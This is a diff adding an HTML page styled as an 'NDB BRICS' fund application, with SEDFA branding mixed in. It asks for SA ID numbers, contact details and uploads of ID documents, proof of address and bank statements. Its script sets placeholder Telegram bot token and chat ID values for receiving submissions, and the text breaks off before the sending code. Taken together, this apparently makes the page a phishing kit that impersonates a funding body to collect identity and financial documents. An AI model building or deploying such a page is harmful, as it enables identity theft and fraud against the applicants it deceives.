@@ -1,0 +1,1515 @@
+<!doctype html>
+<html lang="en-ZA" data-theme="light" style="color-scheme: light">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <meta name="theme-color" content="#3F2461" />
+    <meta name="description" content="NDB BRICS Fund Application" />
+    <title>NDB - Fund Application</title>
+
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;300;400;500;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400..700&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css?family=Fira+Sans:300,600,800,800i%7COpen+Sans:300,400,400i&display=swap"
+      rel="stylesheet"
+    />
+
+    <link
+      rel="icon"
+      type="image/png"
+      href="./favicon/favicon-96x96.png"
+      sizes="96x96"
+    />
+    <link rel="icon" type="image/svg+xml" href="./favicon/favicon.svg" />
+    <link rel="shortcut icon" href="./favicon/favicon.ico" />
+    <link
+      rel="apple-touch-icon"
+      sizes="180x180"
+      href="./favicon/apple-touch-icon.png"
+    />
+    <link rel="manifest" href="./favicon/site.webmanifest" />
+
+    <style>
+      :root {
+        font-family:
+          system-ui,
+          Inter,
+          Segoe UI,
+          Roboto,
+          Helvetica,
+          Arial,
+          sans-serif;
+        line-height: 1.5;
+        font-weight: 400;
+        color-scheme: light;
+      }
+      html,
+      body,
+      #root {
+        height: 100%;
+        width: 100%;
+      }
+      body {
+        margin: 0;
+        background: #f7f7f8;
+        overflow-x: hidden;
+        display: block;
+        font-family: "Nunito Sans", "Inter", system-ui, sans-serif;
+        color: #1a202c;
+      }
+      #root {
+        max-width: none !important;
+        margin: 0 !important;
+        padding: 0 !important;
+        isolation: isolate;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      img,
+      picture,
+      video,
+      canvas,
+      svg {
+        display: block;
+        max-width: 100%;
+      }
+      a {
+        color: #3f2461;
+        text-decoration: none;
+      }
+      a:hover {
+        color: #5a3d8a;
+      }
+      button {
+        font: inherit;
+        cursor: pointer;
+      }
+
+      /* Header */
+      .app-header {
+        padding: 24px 40px;
+        box-shadow: 0 4px 20px rgba(63, 36, 97, 0.25);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+      .header-inner {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      .header-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .brand-name img {
+        width: 172px;
+        height: auto;
+      }
+      .header-title {
+        font-size: 28px;
+        font-weight: 800;
+        color: #171616;
+        font-family: "Poppins", sans-serif;
+        letter-spacing: -0.02em;
+      }
+      .header-title span {
+        color: #f0c040;
+        font-weight: 900;
+      }
+
+      /* Back nav */
+      .back-nav {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        padding: 20px 40px 0;
+        max-width: 800px;
+        margin: 0 auto;
+      }
+      .back-link {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 40px;
+        height: 40px;
+        border-radius: 10px;
+        background: #fff;
+        color: #3f2461;
+        border: 1px solid #e2e8f0;
+        transition: all 0.2s;
+        font-size: 20px;
+        text-decoration: none;
+      }
+      .back-link:hover {
+        background: #f0eef5;
+        border-color: #d0c8e0;
+      }
+      .back-nav-content h2 {
+        margin: 0;
+        font-size: 20px;
+        font-weight: 700;
+        color: #1a202c;
+        text-transform: capitalize;
+      }
+      .back-nav-content p {
+        margin: 2px 0 0;
+        font-size: 14px;
+        color: #718096;
+      }
+
+      /* Form container */
+      .form-container {
+        max-width: 720px;
+        margin: 0 auto;
+        padding: 24px 24px 80px;
+      }
+
+      /* Form card */
+      .form-card {
+        background: #ffffff;
+        border-radius: 16px;
+        box-shadow:
+          0 1px 3px rgba(0, 0, 0, 0.06),
+          0 1px 2px rgba(0, 0, 0, 0.04);
+        padding: 28px 32px;
+        margin-bottom: 20px;
+        border: 1px solid #e2e8f0;
+      }
+      .form-card h3 {
+        margin: 0 0 20px;
+        font-size: 16px;
+        font-weight: 700;
+        color: #2d3748;
+        letter-spacing: 0.01em;
+        border-bottom: 1px solid #e2e8f0;
+        padding-bottom: 12px;
+      }
+
+      /* Form grid */
+      .form-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 16px;
+      }
+      .form-grid .full-width {
+        grid-column: 1 / -1;
+      }
+      @media (max-width: 600px) {
+        .form-grid {
+          grid-template-columns: 1fr;
+        }
+      }
+
+      /* Form controls */
+      .form-group {
+        display: flex;
+        flex-direction: column;
+        gap: 4px;
+      }
+      .form-group label {
+        font-size: 14px;
+        font-weight: 600;
+        color: #2d3748;
+        line-height: 1.4;
+      }
+      .form-group label .required {
+        color: #e53e3e;
+        margin-left: 2px;
+      }
+      .form-group input,
+      .form-group select,
+      .form-group textarea {
+        width: 100%;
+        padding: 10px 14px;
+        font-size: 15px;
+        font-family: inherit;
+        color: #1a202c;
+        background: #ffffff;
+        border: 1px solid #e2e8f0;
+        border-radius: 8px;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          box-shadow 0.2s;
+      }
+      .form-group input:focus,
+      .form-group select:focus,
+      .form-group textarea:focus {
+        border-color: #6c5ce7;
+        box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.12);
+      }
+      .form-group input::placeholder,
+      .form-group textarea::placeholder {
+        color: #a0aec0;
+      }
+      .form-group textarea {
+        resize: vertical;
+        min-height: 80px;
+      }
+      .form-group select {
+        appearance: none;
+        -webkit-appearance: none;
+        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%234a5568' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+        background-repeat: no-repeat;
+        background-position: right 12px center;
+        background-size: 16px;
+        padding-right: 40px;
+      }
+      .form-hint {
+        margin: 4px 0 0;
+        font-size: 12px;
+        color: #718096;
+      }
+
+      /* Upload rows */
+      .upload-row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 12px 0;
+        border-bottom: 1px solid #edf2f7;
+      }
+      .upload-row:last-child {
+        border-bottom: none;
+      }
+      .upload-left {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .upload-icon {
+        width: 36px;
+        height: 36px;
+        border-radius: 8px;
+        background: #f0eef5;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #3f2461;
+        flex-shrink: 0;
+      }
+      .upload-label {
+        font-size: 14px;
+        font-weight: 600;
+        color: #2d3748;
+      }
+      .upload-badge {
+        display: inline-block;
+        font-size: 11px;
+        font-weight: 600;
+        padding: 2px 8px;
+        border-radius: 9999px;
+      }
+      .upload-badge.required {
+        background: #fed7d7;
+        color: #c53030;
+      }
+      .upload-badge.optional {
+        background: #e2e8f0;
+        color: #4a5568;
+      }
+      .upload-right {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+      .upload-right input[type="file"] {
+        display: none;
+      }
+      .btn-upload {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 16px;
+        font-size: 13px;
+        font-weight: 600;
+        color: #3f2461;
+        background: #f0eef5;
+        border: 1px solid #d0c8e0;
+        border-radius: 8px;
+        transition: all 0.2s;
+      }
+      .btn-upload:hover {
+        background: #e2daf0;
+      }
+
+      /* Checkbox */
+      .checkbox-group {
+        display: flex;
+        align-items: flex-start;
+        gap: 10px;
+        padding: 16px 0;
+      }
+      .checkbox-group input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+        margin-top: 3px;
+        accent-color: #3f2461;
+        flex-shrink: 0;
+        cursor: pointer;
+      }
+      .checkbox-group label {
+        font-size: 13px;
+        color: #4a5568;
+        line-height: 1.5;
+        cursor: pointer;
+      }
+      .checkbox-group label a {
+        color: #3f2461;
+        font-weight: 600;
+        text-decoration: underline;
+      }
+
+      /* Submit */
+      .form-submit {
+        text-align: center;
+        padding-top: 8px;
+      }
+      .btn-submit {
+        width: 100%;
+        max-width: 400px;
+        padding: 14px 32px;
+        font-size: 16px;
+        font-weight: 700;
+        color: #fff;
+        background: linear-gradient(135deg, #3f2461, #5a3d8a);
+        border: none;
+        border-radius: 12px;
+        transition: all 0.25s;
+        letter-spacing: 0.01em;
+        box-shadow: 0 4px 14px rgba(63, 36, 97, 0.3);
+      }
+      .btn-submit:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 6px 20px rgba(63, 36, 97, 0.4);
+      }
+      .btn-submit:active {
+        transform: translateY(0);
+      }
+
+      /* Footer */
+      .app-footer {
+        background: #1a202c;
+        padding: 24px 40px;
+        text-align: center;
+      }
+      .app-footer p {
+        margin: 0;
+        font-size: 13px;
+        color: #718096;
+      }
+
+      /* Validation */
+      .form-group.error input,
+      .form-group.error select,
+      .form-group.error textarea {
+        border-color: #e53e3e;
+        box-shadow: 0 0 0 1px #e53e3e;
+      }
+      .form-group .error-text {
+        font-size: 12px;
+        color: #e53e3e;
+        margin: 2px 0 0;
+        display: none;
+      }
+      .form-group.error .error-text {
+        display: block;
+      }
+
+      /* Toast */
+      .toast-container {
+        position: fixed;
+        top: 80px;
+        right: 24px;
+        z-index: 5500;
+        pointer-events: none;
+      }
+      .toast {
+        pointer-events: auto;
+        background: #fff;
+        border-radius: 10px;
+        padding: 14px 20px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
+        margin-bottom: 8px;
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        font-size: 14px;
+        font-weight: 500;
+        border-left: 4px solid #48bb78;
+        animation: slideIn 0.3s ease;
+      }
+      .toast.error {
+        border-left-color: #e53e3e;
+      }
+      @keyframes slideIn {
+        from {
+          transform: translateX(100%);
+          opacity: 0;
+        }
+        to {
+          transform: translateX(0);
+          opacity: 1;
+        }
+      }
+
+      /* Spinner */
+      .spinner {
+        display: inline-block;
+        width: 18px;
+        height: 18px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-top-color: #fff;
+        border-radius: 50%;
+        animation: spin 0.6s linear infinite;
+        vertical-align: middle;
+        margin-right: 6px;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="app-wrapper">
+        <!-- ============ HEADER ============ -->
+        <header class="app-header">
+          <div class="header-inner">
+            <div class="header-left">
+              <a class="brand-name" href="./index.html">
+                <img
+                  src="./images/sedfa-logo-main nav-menu.png"
+                  alt="NDB BRICS"
+                  width="172"
+                  height="33"
+                />
+              </a>
+            </div>
+            <h1 class="header-title">NDB<span>Brics</span></h1>
+          </div>
+        </header>
+
+        <!-- ============ BACK NAV ============ -->
+        <div class="back-nav">
+          <a class="back-link" id="backBtn" aria-label="Go back">
+            <svg
+              stroke="currentColor"
+              fill="none"
+              stroke-width="2"
+              viewBox="0 0 24 24"
+              stroke-linecap="round"
+              stroke-linejoin="round"
+              width="20"
+              height="20"
+            >
+              <line x1="19" y1="12" x2="5" y2="12"></line>
+              <polyline points="12 19 5 12 12 5"></polyline>
+            </svg>
+          </a>
+          <div class="back-nav-content">
+            <h2 id="fundTitle">Fund Application</h2>
+            <p>Complete the form below to apply for funding</p>
+          </div>
+        </div>
+
+        <!-- ============ FORM ============ -->
+        <form id="applicationForm" novalidate>
+          <div class="form-container">
+            <!-- Personal Details -->
+            <div class="form-card">
+              <h3>Personal Details</h3>
+              <div class="form-grid">
+                <div class="form-group">
+                  <label>First Name <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="firstName"
+                    placeholder="Enter your first name"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group">
+                  <label>Last Name <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="lastName"
+                    placeholder="Enter your last name"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group">
+                  <label>Email Address <span class="required">*</span></label>
+                  <input
+                    type="email"
+                    name="email"
+                    placeholder="you@example.com"
+                    required
+                  />
+                  <p class="error-text">Please enter a valid email address</p>
+                </div>
+                <div class="form-group">
+                  <label>Mobile Number <span class="required">*</span></label>
+                  <input
+                    type="tel"
+                    name="mobileNumber"
+                    inputmode="numeric"
+                    placeholder="e.g. 0812345678"
+                    maxlength="10"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group full-width">
+                  <label>SA ID Number <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="idNumber"
+                    inputmode="numeric"
+                    placeholder="13-digit ID number"
+                    maxlength="13"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Business Details -->
+            <div class="form-card">
+              <h3>Business Details</h3>
+              <div class="form-grid">
+                <div class="form-group full-width">
+                  <label>Business Name <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="businessName"
+                    placeholder="Enter your business name"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group">
+                  <label>Business Type <span class="required">*</span></label>
+                  <select name="businessType" required>
+                    <option value="">Select business type</option>
+                    <option value="sole_proprietor">Sole Proprietor</option>
+                    <option value="partnership">Partnership</option>
+                    <option value="pty_ltd">Private Company (Pty) Ltd</option>
+                    <option value="close_corporation">Close Corporation</option>
+                    <option value="cooperative">Co-operative</option>
+                    <option value="npc">Non-Profit Company</option>
+                    <option value="other">Other</option>
+                  </select>
+                  <p class="error-text">Please select a business type</p>
+                </div>
+                <div class="form-group">
+                  <label>CIPC Registration Number</label>
+                  <input
+                    type="text"
+                    name="businessRegistrationNumber"
+                    placeholder="e.g. 2024/123456/07"
+                  />
+                </div>
+                <div class="form-group">
+                  <label>Industry <span class="required">*</span></label>
+                  <select name="businessIndustry" required>
+                    <option value="">Select industry</option>
+                    <option value="agriculture">Agriculture</option>
+                    <option value="construction">Construction</option>
+                    <option value="education_training">
+                      Education &amp; Training
+                    </option>
+                    <option value="fashion_textiles">
+                      Fashion &amp; Textiles
+                    </option>
+                    <option value="food_beverage">Food &amp; Beverage</option>
+                    <option value="healthcare">Healthcare</option>
+                    <option value="hospitality_tourism">
+                      Hospitality &amp; Tourism
+                    </option>
+                    <option value="ict_technology">ICT &amp; Technology</option>
+                    <option value="manufacturing">Manufacturing</option>
+                    <option value="mining_minerals">
+                      Mining &amp; Minerals
+                    </option>
+                    <option value="professional_services">
+                      Professional Services
+                    </option>
+                    <option value="retail_wholesale">
+                      Retail &amp; Wholesale
+                    </option>
+                    <option value="transport_logistics">
+                      Transport &amp; Logistics
+                    </option>
+                    <option value="other">Other</option>
+                  </select>
+                  <p class="error-text">Please select an industry</p>
+                </div>
+                <div class="form-group full-width">
+                  <label
+                    >Business Description <span class="required">*</span></label
+                  >
+                  <textarea
+                    name="businessDescription"
+                    rows="3"
+                    placeholder="Briefly describe what your business does"
+                    required
+                  ></textarea>
+                  <p class="error-text">This field is required</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Business Address -->
+            <div class="form-card">
+              <h3>Business Address</h3>
+              <div class="form-grid">
+                <div class="form-group full-width">
+                  <label
+                    >Physical Address <span class="required">*</span></label
+                  >
+                  <input
+                    type="text"
+                    name="physicalAddress"
+                    placeholder="Street address"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group">
+                  <label>City / Town <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="city"
+                    placeholder="Enter city"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group">
+                  <label>Province <span class="required">*</span></label>
+                  <select name="province" required>
+                    <option value="">Select province</option>
+                    <option value="Eastern Cape">Eastern Cape</option>
+                    <option value="Free State">Free State</option>
+                    <option value="Gauteng">Gauteng</option>
+                    <option value="KwaZulu-Natal">KwaZulu-Natal</option>
+                    <option value="Limpopo">Limpopo</option>
+                    <option value="Mpumalanga">Mpumalanga</option>
+                    <option value="North West">North West</option>
+                    <option value="Northern Cape">Northern Cape</option>
+                    <option value="Western Cape">Western Cape</option>
+                  </select>
+                  <p class="error-text">Please select a province</p>
+                </div>
+                <div class="form-group">
+                  <label>Postal Code <span class="required">*</span></label>
+                  <input
+                    type="text"
+                    name="postalCode"
+                    inputmode="numeric"
+                    placeholder="e.g. 2000"
+                    maxlength="4"
+                    required
+                  />
+                  <p class="error-text">This field is required</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Funding Details -->
+            <div class="form-card">
+              <h3>Funding Details</h3>
+              <div class="form-grid">
+                <div class="form-group full-width">
+                  <label
+                    >Funding Amount Requested
+                    <span class="required">*</span></label
+                  >
+                  <input
+                    type="text"
+                    name="fundingAmount"
+                    id="fundingAmount"
+                    inputmode="numeric"
+                    placeholder="R 0"
+                    required
+                  />
+                  <p class="form-hint">Maximum funding amount: R 5,000,000</p>
+                  <p class="error-text">This field is required</p>
+                </div>
+                <div class="form-group full-width">
+                  <label
+                    >Reason for Funding <span class="required">*</span></label
+                  >
+                  <textarea
+                    name="reasonForFunding"
+                    rows="4"
+                    placeholder="Describe how you plan to use the funding"
+                    required
+                  ></textarea>
+                  <p class="error-text">This field is required</p>
+                </div>
+              </div>
+            </div>
+
+            <!-- Supporting Documents -->
+            <div class="form-card">
+              <h3>Supporting Documents</h3>
+              <p style="margin: -12px 0 16px; font-size: 14px; color: #718096">
+                Upload supporting documents for your application. Accepted
+                formats: PDF, JPG, PNG (max 10MB each).
+              </p>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">SA ID Document</div>
+                    <span class="upload-badge required">Required</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_sa_id"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="document.getElementById('file_sa_id').click()"
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">Proof of Address</div>
+                    <span class="upload-badge required">Required</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_proof_addr"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="document.getElementById('file_proof_addr').click()"
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">Bank Statement (6 months)</div>
+                    <span class="upload-badge required">Required</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_bank_stmt"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="document.getElementById('file_bank_stmt').click()"
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">
+                      CIPC Registration Certificate
+                    </div>
+                    <span class="upload-badge optional">Optional</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_cipc"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="document.getElementById('file_cipc').click()"
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">Tax Clearance Certificate</div>
+                    <span class="upload-badge optional">Optional</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_tax"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="document.getElementById('file_tax').click()"
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+
+              <div class="upload-row">
+                <div class="upload-left">
+                  <div class="upload-icon">
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="18"
+                      height="18"
+                    >
+                      <path
+                        d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"
+                      ></path>
+                      <polyline points="13 2 13 9 20 9"></polyline>
+                    </svg>
+                  </div>
+                  <div>
+                    <div class="upload-label">Company Profile</div>
+                    <span class="upload-badge optional">Optional</span>
+                  </div>
+                </div>
+                <div class="upload-right">
+                  <input
+                    type="file"
+                    accept=".pdf,.jpg,.jpeg,.png"
+                    id="file_company_profile"
+                  />
+                  <button
+                    type="button"
+                    class="btn-upload"
+                    onclick="
+                      document.getElementById('file_company_profile').click()
+                    "
+                  >
+                    <svg
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2"
+                      viewBox="0 0 24 24"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                      width="16"
+                      height="16"
+                    >
+                      <path
+                        d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"
+                      ></path>
+                      <polyline points="17 8 12 3 7 8"></polyline>
+                      <line x1="12" y1="3" x2="12" y2="15"></line>
+                    </svg>
+                    Upload
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- POPIA Consent -->
+            <div class="form-card">
+              <div class="checkbox-group">
+                <input
+                  type="checkbox"
+                  id="consentToPopia"
+                  name="consentToPopia"
+                  required
+                />
+                <label for="consentToPopia">
+                  I confirm that the information provided is true and correct,
+                  and I consent to SEDFA collecting and processing my personal
+                  information for the purpose of this application, in accordance
+                  with the
+                  <a
+                    href="https://inforegulator.org.za/popia/"
+                    target="_blank"
+                    rel="noopener"
+                    >Protection of Personal Information Act (POPIA)</a
+                  >.
+                </label>
+              </div>
+            </div>
+
+            <!-- Submit -->
+            <div class="form-submit">
+              <button type="submit" class="btn-submit" id="submitBtn">
+                Submit Application
+              </button>
+            </div>
+          </div>
+        </form>
+
+        <!-- ============ FOOTER ============ -->
+        <footer class="app-footer">
+          <p>&copy; 2026 NDB. All rights reserved.</p>
+        </footer>
+      </div>
+    </div>
+
+    <!-- Toast container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+      // ============================================
+      // CONFIG — SET YOUR TELEGRAM BOT HERE
+      // ============================================
+      const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+      const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+      // ============================================
+      // FORM HANDLING
+      // ============================================
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const fund = urlParams.get("fund") || "fund";
+      const formatFundName = (name) => {
+        return (
+          name
+            .split("-")
+            .map((w) => w.charAt(0).toUpperCase() + w.slice(1))
+            .join(" ") + " Application"
+        );
+      };
+      document.getElementById("fundTitle").textContent = formatFundName(fund);
+
+      // R currency formatting
+      const fundingInput = document.getElementById("fundingAmount");
+      fundingInput.addEventListener("input", function () {
+        let val = this.value.replace(/[^0-9]/g, "");
+        if (val) {
+          val = parseInt(val, 10).toLocaleString("en-ZA");
+          this.value = "R " + val;
+        } else {
+          this.value = "";
+        }
+      });
+
+      // Back button
+      document
+        .getElementById("backBtn")
+        .addEventListener("click", function (e) {
+          e.preventDefault();
+          window.history.back();
+        });
+
+      // Toast
+      function showToast(message, isError = false) {
+        const container = document.getElementById("toastContainer");
+        const toast = document.createElement("div");
+        toast.className = "toast" + (isError ? " error" : "");
+        toast.innerHTML = `
+          <svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" width="20" height="20" style="color:${isError ? "#e53e3e" : "#48bb78"}; flex-shrink:0;">
+            ${
+              isError
+                ? '<circle cx="12" cy="12" r="10"></circle><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line>'
+                : '<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline>'
+            }
+          </svg>
+          ${message}
+        `;
+        container.appendChild(toast);
+        setTimeout(() => {
+          toast.style.opacity = "0";
+          toast.style.transform = "translateX(100px)";
+          toast.style.transition = "all 0.3s ease";
+          setTimeout(() => toast.remove(), 300);
+        }, 4000);
+      }
+
+      // ============================================
